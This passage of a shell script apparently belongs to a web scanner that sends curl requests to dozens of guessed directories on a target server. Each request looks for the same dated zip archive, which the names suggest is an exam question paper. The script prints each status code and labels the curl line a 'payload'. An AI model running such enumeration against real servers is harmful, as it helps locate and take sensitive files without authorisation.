echo -n "Payload [QPCloud-Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocDatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocDatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
